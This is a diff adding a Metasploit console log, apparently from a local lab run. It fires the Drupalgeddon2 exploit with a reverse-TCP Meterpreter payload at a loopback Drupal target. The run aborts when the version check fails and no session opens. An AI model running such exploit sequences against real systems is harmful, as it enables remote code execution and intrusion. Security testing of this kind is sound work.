@@ -1,0 +1,26 @@
+[*] Processing /tmp/opencode/msf-d7600.rc for ERB directives.
+resource (/tmp/opencode/msf-d7600.rc)> use exploit/unix/webapp/drupal_drupalgeddon2
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+resource (/tmp/opencode/msf-d7600.rc)> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+resource (/tmp/opencode/msf-d7600.rc)> set RPORT 18021
+RPORT => 18021
+resource (/tmp/opencode/msf-d7600.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (/tmp/opencode/msf-d7600.rc)> set LPORT 4441
+LPORT => 4441
+resource (/tmp/opencode/msf-d7600.rc)> set TARGETURI /
+TARGETURI => /
+resource (/tmp/opencode/msf-d7600.rc)> set SSL false
+SSL => false
+resource (/tmp/opencode/msf-d7600.rc)> set VERBOSE true
+VERBOSE => true
+resource (/tmp/opencode/msf-d7600.rc)> run
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4441 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[-] Could not determine Drupal version to target
+[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. Could not determine the target status "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+stty: 'standard input': Inappropriate ioctl for device
+[4mmsf[0m exploit([1m[31munix/webapp/drupal_drupalgeddon2[0m) [0m> 
